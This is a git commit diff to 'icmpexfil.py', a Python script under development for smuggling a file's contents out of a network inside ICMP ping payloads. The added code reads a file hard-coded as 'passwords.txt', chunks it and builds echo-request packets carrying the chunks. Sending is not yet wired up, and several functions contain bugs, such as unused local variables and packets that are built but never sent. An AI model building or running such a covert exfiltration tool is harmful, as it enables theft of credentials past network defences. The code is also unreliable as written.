86f1c7f2947884e713afad1b74b6c98913382205
Harvey <harvs899@hotmail.co.uk>
2015-07-16 23:02:55 +0100

    Added file read functionality, chunking up of files, and chunks as ICMP payloads

--- icmpexfil.py
+++ icmpexfil.py
@@ -3,24 +3,66 @@ import socket
 import binascii
 import random
 
+startByte = 0
+chunkLength = 2
+exfilBytes = b''
+currentFilePath = "passwords.txt"
 ICMP_ECHO_REQUEST = 8
 ICMP_ECHO_REPLY = 0
 
 ICMP_CODE = socket.getprotobyname('icmp')
 
+def init():
+    global exfilBytes
+    startByte = 0
+    exfilBytes = readFile("passwords.txt", "rb")
+    
 def createPacket(id):
     t = ICMP_ECHO_REQUEST # This is the type of ICMP packet
     c = 0 # This is the code, or sub type, for the ICMP packet
     checkSum = 0
     # Type (8), code(8), checksum(16), id(16), sequence(16)
     icmpHeader = struct.pack("bbHHh", t, c, checkSum, id, 0)
-    #data = "Hello World!"
-    #data = (192 - len(data)) * 'Z' #Fill the rest of the data with Zs
-    bytesInDouble = struct.calcsize("d")
-    data = 192 * 'Q'
+    data = getNextChunk(startByte, chunkLength)
     
-    return icmpHeader + binascii.a2b_base64(data)
+    return icmpHeader + data
 
+def getNextChunk(sb, cl):
+    global startByte
+    chunk = b''
+    # Check if chunk overlaps end of file
+    if (sb + cl) > (len(exfilBytes) - 1):
+        # If yes then set the chunk size to the remainder of the file
+        chunkLength = len(exfilBytes) - sb
+
+        # Need to send EOF
+    for i in range(sb, sb + cl):
+        chunk += exfilBytes[i:i+1]
+    startByte += cl
+    return chunk
+
+def sendStartOfFile():
+    createPacket(1)
+    
+def sendEndOfFile():
+    createPacket(2)
+    
+def stringToBin(s):
+    b = ''.join(format(ord(x), 'b') for x in s)
+    return b
+  
+def readFile(name, mode):
+    fileBytes = b''
+    # Use 'rb' mode for reading in binary
+    f = open(name, mode)
+    try:
+        byte = f.read(1)
+        while byte != b'':
+            fileBytes += byte
+            byte = f.read(1)
+    finally:
+        f.close()
+    return fileBytes        
 def do_one(dest_addr, timeout=1):
     """
     Sends one ping to the given "dest_addr" which can be an ip or hostname.
@@ -55,5 +97,5 @@ def do_one(dest_addr, timeout=1):
     #return delay
     return
 
-do_one("8.8.8.8")
+init()
     
